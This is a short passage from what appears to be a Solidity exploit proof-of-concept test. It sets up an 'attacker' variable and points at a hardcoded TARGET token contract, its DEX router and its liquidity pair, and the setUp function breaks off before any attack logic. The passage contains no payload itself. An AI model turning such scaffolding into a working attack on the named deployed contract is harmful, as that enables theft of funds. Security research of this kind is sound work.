    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker;

    FoundationToken target;
    IDexRouter router;
    address lpPair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        target = FoundationToken(TARGET);
        router = target.dexRouter();
        lpPair = target.lpPair();

